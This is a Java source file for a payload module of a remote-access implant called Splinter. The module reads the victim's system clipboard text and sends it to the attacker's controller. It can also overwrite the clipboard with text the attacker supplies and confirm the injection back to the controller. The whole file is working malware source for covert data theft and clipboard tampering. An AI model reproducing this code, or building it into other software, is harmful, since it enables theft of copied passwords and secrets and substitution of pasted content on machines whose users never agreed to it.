/**
 * COPY CONTENTS OF CLIPBOARD
 * 
 * 
 * @author Solomon Sonya
 */


package Implant.Payloads;


import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.awt.*;
import java.awt.datatransfer.*;

//source: http://www.javapractices.com/topic/TopicAction.do?Id=82

public class ClipboardPayload 
{

	 static Clipboard extract_clipboard = null;
	 static Clipboard inject_clipboard = null;
	 
	 static StringSelection strSelection = null;
	
	public static final String strMyClassName = "ClipboardPayload";
	
	public ClipboardPayload()
	{
		try
		{
			
			
			
		}
		catch(Exception e)
		{
			Driver.eop("Copy_Clipboard Constructor", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public static boolean copyClipboard(Splinter_IMPLANT terminal)
	{
		try
		{
			extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			Transferable clipboard_Contents = extract_clipboard.getContents(null);
			
			
			//check if there is transferrable text:
			if(extract_clipboard != null && clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor))
			{
				terminal.sendToController(terminal.myUniqueDelimiter  + Driver.delimeter_1 + Driver.RESPONSE_CLIPBOARD + Driver.delimeter_1 + clipboard_Contents.getTransferData(DataFlavor.stringFlavor), false, false);
			}
			else
			{
				terminal.sendToController(terminal.myUniqueDelimiter  + Driver.delimeter_1 + Driver.RESPONSE_CLIPBOARD + Driver.delimeter_1 + Driver.NO_TEXT_RESPONSE_CLIPBOARD, false, false);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("NOPE --> Could not gain exclusive access to Clipboard");
			//Driver.eop("copyClipboard", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	/**
	 * ONLY RETURNS TEXT DATA AT THIS TIME
	 * @return
	 */
	public static String getClipboardText()
	{
		try
		{
			extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			Transferable clipboard_Contents = extract_clipboard.getContents(null);
			
			
			//check if there is transferrable text:
			if(extract_clipboard != null && clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor))
			{
				return ""+clipboard_Contents.getTransferData(DataFlavor.stringFlavor);
			}
			
			//else
			
			//don't any text data to return
			return Driver.NO_TEXT_RESPONSE_CLIPBOARD;
			
		}
		catch(Exception e)
		{
			//Driver.eop("getClipboardText", strMyClassName, e, e.getLocalizedMessage(), false);
			Driver.sop("[" + Driver.getTimeStamp_Without_Date() + "] -  Unable to extract Clipboard contents...");
		}
		
		return Driver.NO_TEXT_RESPONSE_CLIPBOARD_ERROR;
	}
	
	
	
	
	public static boolean injectClipboard(Splinter_IMPLANT terminal, String injection)
	{
		try
		{
			if(injection == null)
				injection = "";
			
			strSelection = new StringSelection(injection);
			inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			inject_clipboard.setContents(strSelection, null);
			
			terminal.sendToController(terminal.myUniqueDelimiter  + Driver.delimeter_1 + Driver.RESPONSE_CLIPBOARD + Driver.delimeter_1 + "* * * Clipboard Injection Complete * * *", false, false);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("injectClipboard", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public static boolean injectClipboard(String injection)
	{
		try
		{
			if(injection == null)
				injection = "";
			
			strSelection = new StringSelection(injection);
			inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			inject_clipboard.setContents(strSelection, null);
			
			// Driver.RESPONSE_CLIPBOARD + Driver.delimeter_1 + "* * * Clipboard Injection Complete * * *"
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("injectClipboard", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
}
